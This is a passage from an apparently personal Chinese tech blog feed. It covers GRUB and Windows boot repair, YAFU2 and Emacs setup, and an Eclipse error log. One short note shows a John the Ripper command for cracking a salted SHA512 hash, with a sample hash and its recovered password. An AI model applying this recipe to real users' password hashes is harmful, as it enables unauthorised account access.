<code>/dev/nvme0n1p7</code> 就代表第7块扇区, 所以他的表达就是 <code>&#39;hd1,7&#39;</code> 或者 <code>&#39;hd1,gpt7&#39;</code> 或者 <code>(hd1,gpt7)</code>; <code>&lt;EFI UUID&gt;</code> 是 EFI 分区的 UUID; <code>&lt;ARCH UUID&gt;</code> 是 ArchLinux 分区的 UUID<br><code>/vmilinuz-linux</code> 是内核文件, <code>/intel-ucode.img</code> 是 ucode 文件, <code>/initramfs-linux.img</code> 是内核镜像文件, 他们都在 <code>/boot</code> 下 (在 #1.3 中安装)<br>填入后就像:  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Arch&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ext2</span><br><span class="line">        insmod gzio</span><br><span class="line">        <span class="built_in">set</span> root=<span class="string">&#x27;hd1,gpt7&#x27;</span></span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root 1111-A1B2</span><br><span class="line">        linux /vmlinuz-linux root=UUID=11111111-1111-1111-1111-111111111111 rw loglevel=3</span><br><span class="line">        initrd /intel-ucode.img /initramfs-linux.img</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>grub-mkconfig -o /boot/grub/grub.cfg</code> 生成 <code>grub.cfg</code></li><li>到目前为止, ArchLinux 的引导就重建好了</li></ol><h2 id="2-重建-Windows-引导"><a href="#2-重建-Windows-引导" class="headerlink" title="2. 重建 Windows 引导"></a>2. 重建 Windows 引导</h2><ol start="0"><li>在 Windows PE 中</li><li><code>diskpart</code> 进入磁盘管理</li><li>参考之前看的 EFI 分区的位置, 选中 EFI 分区, 假设是 <code>hd1,gpt7</code>, 就 <code>select disk 1</code> 然后 <code>select partition 7</code></li><li><code>assign</code> 把 EFI 分区挂载</li><li>进资源管理器看 EFI 的盘符, 假设是 <code>E:</code></li><li>进控制台, <code>bcdboot C:\Windows /s E: /f UEFI</code> 重建引导</li><li>进挂载的 EFI 分区, 里面应该有 <code>/EFI/Microsoft/Boot</code>, 然后下面都是 Windows 的引导文件</li><li>目前为止, Windows 的引导就重建好了</li></ol><h2 id="3-重建-grub-引导-Windows"><a href="#3-重建-grub-引导-Windows" class="headerlink" title="3. 重建 grub 引导 Windows"></a>3. 重建 grub 引导 Windows</h2><ol start="0"><li>在 ArchLinux 中</li><li><code>mount /dev/nvme0n1p7 /boot</code> 挂载 EFI 分区, 如果还没挂载</li><li><code>cp /etc/grub.d/10_linux /etc/grub.d/10_windows</code> 复制一份</li><li>修改 <code>/etc/grub.d/10_windows</code> 为<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Windows 11&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ntfs</span><br><span class="line">        <span class="built_in">set</span> root=&lt;EFI DISK PARTITION ID&gt;</span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root &lt;EFI UUID&gt;</span><br><span class="line">        insmod chain</span><br><span class="line">        chainloader /EFI/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>其中 <code>&lt;EFI DISK PARTITION ID&gt;</code> 是 EFI 分区的硬盘表达; <code>&lt;EFI UUID&gt;</code> 是 EFI 分区的 UUID<br><code>/EFI/Microsoft/Boot/bootmgfw.efi</code> 是第2节中 Windows PE 安装的引导文件<br>填入后就像:  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Windows 11&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ntfs</span><br><span class="line">        <span class="built_in">set</span> root=<span class="string">&#x27;hd1,gpt7&#x27;</span></span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root 1111-A1B2</span><br><span class="line">        insmod chain</span><br><span class="line">        chainloader /EFI/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>grub-mkconfig -o /boot/grub/grub.cfg</code> 生成 <code>grub.cfg</code></li><li>到目前为止, grub 的引导就重建好了</li></ol><center> -EOF- </center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> grub </tag>
            
            <tag> Arch </tag>
            
            <tag> EFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>john the ripper 解密加盐后密文</title>
      <link href="/2023/09/01/john-the-ripper-%E8%A7%A3%E5%AF%86-salted-SHA512/"/>
      <url>/2023/09/01/john-the-ripper-%E8%A7%A3%E5%AF%86-salted-SHA512/</url>
      
        <content type="html"><![CDATA[<blockquote><p>source: <a href="https://github.com/openwall/john/issues/2125#issuecomment-213401203">Possible to crack salted-sha512?</a>  </p></blockquote><p>密文是用 <code>passowrd + salt</code> 形式 SHA512 加密的, 所以就</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=<span class="string">&#x27;dynamic=sha512($p.$s)&#x27;</span> hash.hash</span><br></pre></td></tr></table></figure><p>然后在文件里是 <code>hash$salt</code> 的形式，比如<code>hash.hash</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05</span><br></pre></td></tr></table></figure><p>结果:<br><code>john --format=&#39;dynamic=sha512($p.$s)&#39; --show hash.hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?:november16</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> john </tag>
            
            <tag> salted </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch Yafu2 安装指南</title>
      <link href="/2023/07/25/Arch-%E5%AE%89%E8%A3%85-Yafu2/"/>
      <url>/2023/07/25/Arch-%E5%AE%89%E8%A3%85-Yafu2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>YAFU is the result of an ongoing hobby project to understand how to factor<br>large integers, and how to factor them fast.   </p></blockquote><p><strong>参考:</strong> <a href="https://www.mersenneforum.org/showthread.php?p=634890">How I install YAFU version 2 onto my Ubuntu Machines by EdH</a><br><strong>Yafu2 官方 thread:</strong> <a href="https://www.mersenneforum.org/showthread.php?t=26681">YAFU 2.0</a></p><h2 id="0-前置依赖"><a href="#0-前置依赖" class="headerlink" title="0. 前置依赖"></a>0. 前置依赖</h2><p>先准备一个空文件夹, 为了方便依赖和yafu2本体装在一个文件夹下  </p><h3 id="0-1-GMP"><a href="#0-1-GMP" class="headerlink" title="0.1 GMP"></a>0.1 GMP</h3><ol><li>找到 <a href="https://gmplib.org/download/gmp">https://gmplib.org/download/gmp</a> 下最新版本并下载(比如我现在是 <code>v6.2.1</code>)</li><li>解压改名</li><li><code>./configure</code>和<code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://gmplib.org/download/gmp/gmp-6.2.1.tar.bz2</span><br><span class="line">tar jxvf gmp-6.2.1.tar.bz2</span><br><span class="line"><span class="built_in">mv</span> gmp-6.2.1 gmp</span><br><span class="line"><span class="built_in">cd</span> gmp</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><h3 id="0-2-GMP-ECM"><a href="#0-2-GMP-ECM" class="headerlink" title="0.2 GMP-ECM"></a>0.2 GMP-ECM</h3><ol><li>找到 <a href="https://gitlab.inria.fr/zimmerma/ecm/-/releases">https://gitlab.inria.fr/zimmerma/ecm/-/releases</a> 的最新 release (现在是 <code>v7.0.5</code>) 然后复制他的下载链接(<code>ecm-x.y.z.tar.gz</code>)并下载</li><li>解压改名</li><li><code>configure</code> 和 <code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitlab.inria.fr/zimmerma/ecm/uploads/89f6f0d65d3e980cef33dc922004e4b2/ecm-7.0.5.tar.gz</span><br><span class="line">tar zxvf ecm-7.0.5.tar.gz</span><br><span class="line"><span class="built_in">mv</span> ecm-7.0.5 gmp-ecm</span><br><span class="line"><span class="built_in">cd</span> gmp-ecm</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><h3 id="0-3-msieve"><a href="#0-3-msieve" class="headerlink" title="0.3 msieve"></a>0.3 msieve</h3><ol><li>找到 <a href="https://sourceforge.net/projects/msieve/files/msieve">https://sourceforge.net/projects/msieve/files/msieve</a> 的最新版本 (现在是 <code>v1.53</code>) 然后下载源码 (<code>msievexyz_src.tar.gz</code>或者<code>msievexyz.tar.gz</code>)</li><li>解压改名和<code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://sourceforge.net/projects/msieve/files/msieve/Msieve%20v1.53/msieve153_src.tar.gz/download</span><br><span class="line">tar zxvf download</span><br><span class="line"><span class="built_in">mv</span> msieve-1.53 msieve</span><br><span class="line"><span class="built_in">cd</span> msieve</span><br><span class="line">make all</span><br></pre></td></tr></table></figure><h3 id="0-4-ytools"><a href="#0-4-ytools" class="headerlink" title="0.4 ytools"></a>0.4 ytools</h3><ol><li>git clone</li><li>改 Makefile:<br> <code>CC = gcc-7.3.0</code> &#x3D;&gt; <code>CC = gcc</code>  </li><li><code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:bbuhrow/ytools.git <span class="comment"># or git clone https://github.com/bbuhrow/ytools</span></span><br><span class="line"><span class="built_in">cd</span> ytools</span><br><span class="line">vim Makefile</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="0-5-ysieve"><a href="#0-5-ysieve" class="headerlink" title="0.5 ysieve"></a>0.5 ysieve</h3><ol><li>git clone</li><li><code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:bbuhrow/ysieve.git <span class="comment"># or git clone https://github.com/bbuhrow/ysieve</span></span><br><span class="line"><span class="built_in">cd</span> ysieve</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h2 id="1-安装-Yafu2"><a href="#1-安装-Yafu2" class="headerlink" title="1. 安装 Yafu2"></a>1. 安装 Yafu2</h2><ol><li>git clone <code>git clone git@github.com:bbuhrow/yafu.git</code></li><li>修改 Makefile:<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INC += -I../gmp_install/gmp-6.2.0/<span class="keyword">include</span></span><br><span class="line">LIBS += -L../gmp_install/gmp-6.2.0/lib</span><br><span class="line"></span><br><span class="line">INC += -I../ecm_install/<span class="keyword">include</span>/</span><br><span class="line">LIBS += -L../ecm_install/lib/</span><br></pre></td></tr></table></figure>to<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INC += -I/usr/local/<span class="keyword">include</span>/</span><br><span class="line">LIBS += -L/usr/local/<span class="keyword">include</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment">#INC += -I../ecm_install/include/</span></span><br><span class="line"><span class="comment">#LIBS += -L../ecm_install/lib/</span></span><br></pre></td></tr></table></figure></li><li>执行 <code>lscpu</code> 主要看核数和那些 cpu flag</li><li>修改 <code>yafu.ini</code>  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="attr">threads</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">ggnfs_dir</span>=..\..\ggnfs-bin\x64\</span><br><span class="line"><span class="attr">ecm_path</span>=..\..\gmp-ecm\bin\mingw\ecm.exe</span><br></pre></td></tr></table></figure>to  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">threads</span>=&lt;<span class="comment"># CPU 数量&gt;</span></span><br><span class="line"><span class="attr">ggnfs_dir</span>=../ggnfs/bin/</span><br><span class="line"><span class="attr">ecm_path</span>=/usr/local/bin/ecm</span><br></pre></td></tr></table></figure>这里 <code>ggnfs_dir</code> 没装也没问题  </li><li>[可选] 可以在下一步的 make 命令加上那些 CPU flag, 比如 <code>make NFS=1 USE_SSE41=1 USEAVX2=1</code>, 不过这也可能导致问题, 我电脑上就只能编 <code>NFS=1</code></li><li><code>make NFS=1</code></li></ol><h2 id="2-Troubleshooting"><a href="#2-Troubleshooting" class="headerlink" title="2 Troubleshooting"></a>2 Troubleshooting</h2><h3 id="2-1-SIQS-c-2448-undefined-reference-to-nextRoots-32k-avx2-intrin"><a href="#2-1-SIQS-c-2448-undefined-reference-to-nextRoots-32k-avx2-intrin" class="headerlink" title="2.1 SIQS.c:2448: undefined reference to &#39;nextRoots_32k_avx2_intrin&#39;"></a>2.1 <code>SIQS.c:2448: undefined reference to &#39;nextRoots_32k_avx2_intrin&#39;</code></h3><p>因为没有清理之前不同 flag 编译结果导致的, 在下一次 <code>make</code> 前执行 <code>make clean</code> + 那些 flag 就行</p><h3 id="2-2-msieve-找不到-gzlib-function"><a href="#2-2-msieve-找不到-gzlib-function" class="headerlink" title="2.2 msieve 找不到 gzlib function"></a>2.2 msieve 找不到 gzlib function</h3><p>具体日志如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_open&#x27;:</span><br><span class="line">savefile.c:(.text+0x132): undefined reference to `gzopen64&#x27;</span><br><span class="line">/usr/bin/ld: savefile.c:(.text+0x23e): undefined reference to `gzopen64&#x27;</span><br><span class="line">/usr/bin/ld: savefile.c:(.text+0x269): undefined reference to `gzopen64&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_close&#x27;:</span><br><span class="line">savefile.c:(.text+0x311): undefined reference to `gzclose&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_write_line&#x27;:</span><br><span class="line">savefile.c:(.text+0x3f9): undefined reference to `gzputs&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_flush&#x27;:</span><br><span class="line">savefile.c:(.text+0x46c): undefined reference to `gzputs&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_eof&#x27;:</span><br><span class="line">savefile.c:(.text+0x339): undefined reference to `gzeof&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_read_line&#x27;:</span><br><span class="line">savefile.c:(.text+0x39c): undefined reference to `gzgets&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_rewind&#x27;:</span><br><span class="line">savefile.c:(.text+0x499): undefined reference to `gzrewind&#x27;</span><br></pre></td></tr></table></figure><p>在 yafu 的 Makefile 里面加上 <code>LIBS+= -lc -lz</code></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
            <tag> yafu2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl2 / ubuntu 安装和配置 Emacs + mit-scheme</title>
      <link href="/2023/02/10/emacs-configuration/"/>
      <url>/2023/02/10/emacs-configuration/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要是看 SICP 书的时候配下环境</p></blockquote><h2 id="1-首先安装-Emacs-和-mit-scheme"><a href="#1-首先安装-Emacs-和-mit-scheme" class="headerlink" title="1 首先安装 Emacs 和 mit-scheme"></a>1 首先安装 Emacs 和 mit-scheme</h2><p>第一条命令可以直接安装最新开发版的 Emacs, 目前是 <code>GNU Emacs 30.0.50</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install emacs --edge --classic</span><br><span class="line">sudo apt install mit-scheme</span><br></pre></td></tr></table></figure><h2 id="2-配置-Emacs"><a href="#2-配置-Emacs" class="headerlink" title="2 配置 Emacs"></a>2 配置 Emacs</h2><h3 id="2-1-一些提示"><a href="#2-1-一些提示" class="headerlink" title="2.1 一些提示"></a>2.1 一些提示</h3><p>先在这说几个可能有用的快捷键</p><ul><li><code>Ctrl + x + f</code> 打开文件</li><li><code>Ctrl + x + k</code> 关闭&#x2F;丢弃当前区域的缓冲区, 不严谨的说相当于关闭那个窗口</li><li><code>Ctrl + x</code> + <code>o</code> 切换编辑窗口</li><li><code>Ctrl + x + s</code> 保存当前缓冲区&#x2F;文件</li><li><code>Alt + x</code> + <code>cua-mode</code> 相当于激活复制粘贴模式, 也就是说可以从外部粘贴板复制和粘贴内容用 <code>Ctrl + c</code> 和 <code>Ctrl + v</code> 系列快捷键</li><li><code>Alt + x</code> + <code>eval-buffer</code> 重新载入当前缓冲区, 更改配置文件后可以用这个重新加载</li><li><code>Ctrl + x + c</code> 退出</li><li>可以在 <code>Ctrl + x</code> 或者 <code>Alt + x</code> 后按空格或者 Tab 获得提示&#x2F;联想</li></ul><h3 id="2-2-配置本体"><a href="#2-2-配置本体" class="headerlink" title="2.2 配置本体"></a>2.2 配置本体</h3><ol><li>这里我就直接用 Emacs 当编辑器, 首先用 <code>emacs</code> 进入 Emacs<br>虽然是安装在 wsl 里的, 但是现在 wsl 支持在 windows 里打开 linux GUI, 然后进入 Emacs  </li><li>按 <code>Ctrl + h</code> 再输入 <code>v</code> 和 <code>user-init-file</code><br><img src="/images/emacs-config-4.jpg" alt="user-init-file"><br>在下面的回显区就会出现配置文件路径, 通常为 <code>~/.emacs</code><br><img src="/images/emacs-config-4.jpg" alt="path"></li><li>然后按 <code>Ctrl + x + f</code> 输入 <code>~/.emacs</code> 作为文件路径在下面的命令区, 如果没有就创建<br><img src="/images/emacs-config-3.jpg" alt="emacs">  </li><li>在文件里添加包管理地址  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;; add the melpa package</span><br><span class="line">(require &#x27;package)</span><br><span class="line">(add-to-list &#x27;package-archives</span><br><span class="line">     &#x27;(&quot;melpa&quot; . &quot;https://melpa.org/packages/&quot;) t)</span><br><span class="line">(package-initialize)</span><br><span class="line">(package-refresh-contents)</span><br></pre></td></tr></table></figure></li><li>用重启 Emacs 或者 <code>Alt + x</code> + <code>eval-buffer</code> 重载配置文件  </li><li>然后用 <code>Alt + x</code> + <code>package-install</code> + 回车 + <code>geiser</code> 安装 geiser 用于 REPL, 也就是类似即使反馈代码的效果  </li><li>安装完后重新用第2到3步打开配置文件</li><li>往文件里添加 mit-scheme 兼容<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(use-package geiser-mit :ensure t)</span><br><span class="line">(setq geiser-mit-binary &quot;/usr/bin/scheme&quot;)</span><br><span class="line">(setq geiser-active-implementations &#x27;(mit))</span><br></pre></td></tr></table></figure>可以放到文件末尾, geiser-mit-binary 的地址是你前面 apt 安装的地址, 也可以用 <code>which mit-scheme</code> 来看地址<br>到目前为止基础的都配置完了</li></ol><h3 id="2-3-可选-配置主题"><a href="#2-3-可选-配置主题" class="headerlink" title="2.3 [可选] 配置主题"></a>2.3 [可选] 配置主题</h3><ol><li>在 <a href="https://emacsthemes.com/">这里</a> 找到个主题</li><li>用 <code>Alt + x</code> + <code>package-install</code> + 回车 + <code>&lt;主题名&gt;</code>, 比如 <code>zenburn-theme</code> 或者 <code>vs-dark-theme</code></li><li>用前面的方法打开配置文件</li><li>在文件里加入 <code>(load-theme &#39;&lt;主题&gt; t)</code>, 比如以 vs dark theme 为例子: <code>(load-theme &#39;vs-dark t)</code>, 要去掉最后的 theme 后缀</li><li>重启 Emacs 或者重载缓冲区(<code>Alt + x</code> + <code>eval-buffer</code>)来查看效果</li></ol><h2 id="3-Hello-world"><a href="#3-Hello-world" class="headerlink" title="3 Hello world"></a>3 Hello world</h2><ol><li>用 <code>Alt + x + f</code> 打开任意一个 scm &#x2F; 或者不是 scm 文件, 比如 <code>~/sicp/test.scm</code> </li><li>输入 “Hello world”<br><img src="/images/emacs-config-1.png" alt="hello"></li><li>用 <code>Alt + x</code> + <code>run-geiser</code> 激活 geiser</li><li>把光标移回到你文件(有”hello world”)的那个窗口, 比如用 <code>Ctrl + x</code> + <code>o</code> 或者鼠标点那个窗口</li><li>将光标移动到 “Hello world” 的后面, 用上下左右箭头&#x2F;鼠标&#x2F;或者 (<code>Ctrl + b</code> &#x2F; <code>Ctrl + f</code> 之类的)</li><li>用 <code>Ctrl + Alt + x</code> 跑光标这一行</li><li>在最下面的命令窗口就会有结果<br><img src="/images/emacs-config-2.png" alt="result"></li></ol><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><p>Emacs 配置: <a href="https://github.com/bluemonk/modern-emacs">https://github.com/bluemonk/modern-emacs</a><br>Emacs 使用习惯: <a href="https://www.masteringemacs.org/article/beginners-guide-to-emacs">https://www.masteringemacs.org/article/beginners-guide-to-emacs</a><br>Hello world: <a href="https://medium.com/@joshfeltonm/setting-up-emacs-for-sicp-from-scratch-daa6473885c5">https://medium.com/@joshfeltonm/setting-up-emacs-for-sicp-from-scratch-daa6473885c5</a><br>内置 Emacs 文档: <code>Ctrl + h</code> + <code>t</code></p><center> EOF </center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Emacs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eclipse java.lang.NoSuchMethodError: &#39;boolean com.ibm.icu.text.UTF16.isSurrogate(char)&#39;</title>
      <link href="/2023/01/10/eclipse-UTF16.isSurrogate-NoSuchMethodError/"/>
      <url>/2023/01/10/eclipse-UTF16.isSurrogate-NoSuchMethodError/</url>
      
        <content type="html"><![CDATA[<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">!ENTRY org.eclipse.core.jobs 4 2 2023-01-10 14:29:04.005</span><br><span class="line">!MESSAGE An internal error occurred during: &quot;Requesting Java AST from selection&quot;.</span><br><span class="line">!STACK 0</span><br><span class="line">java.lang.NoSuchMethodError: &#x27;boolean com.ibm.icu.text.UTF16.isSurrogate(char)&#x27;</span><br><span class="line">at org.eclipse.jdt.internal.ui.text.JavaWordFinder.findWord(JavaWordFinder.java:61)</span><br><span class="line">at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.updateOccurrenceAnnotations(JavaEditor.java:3300)</span><br><span class="line">at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.lambda$4(JavaEditor.java:3363)</span><br><span class="line">at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup.calculateASTandInform(SelectionListenerWithASTManager.java:175)</span><br><span class="line">at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup$1.run(SelectionListenerWithASTManager.java:151)</span><br><span class="line">at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)</span><br><span class="line"></span><br><span class="line">!ENTRY org.eclipse.core.jobs 4 2 2023-01-10 14:29:04.266</span><br><span class="line">!MESSAGE An internal error occurred during: &quot;Requesting Java AST from selection&quot;.</span><br><span class="line">!STACK 0</span><br><span class="line">java.lang.NoSuchMethodError: &#x27;boolean com.ibm.icu.text.UTF16.isSurrogate(char)&#x27;</span><br><span class="line">at org.eclipse.jdt.internal.ui.text.JavaWordFinder.findWord(JavaWordFinder.java:61)</span><br><span class="line">at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.updateOccurrenceAnnotations(JavaEditor.java:3300)</span><br><span class="line">at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.lambda$4(JavaEditor.java:3363)</span><br><span class="line">at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup.calculateASTandInform(SelectionListenerWithASTManager.java:175)</span><br><span class="line">at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup$1.run(SelectionListenerWithASTManager.java:151)</span><br><span class="line">at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Eclipse IDE for Java Developers (includes Incubating components)<br>Version: 2022-06 (4.24.0)<br>Build id: 20220609-1112<br>openjdk 15</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>测试了几遍, 发现是装了 Eclipse Web Developer Tools 导致的<br>Eclipse Web Developer Tools3.26.0.v202204091445org.eclipse.wst.web_ui.feature.feature.group</p><h3 id="Solution"><a href="#Solution" 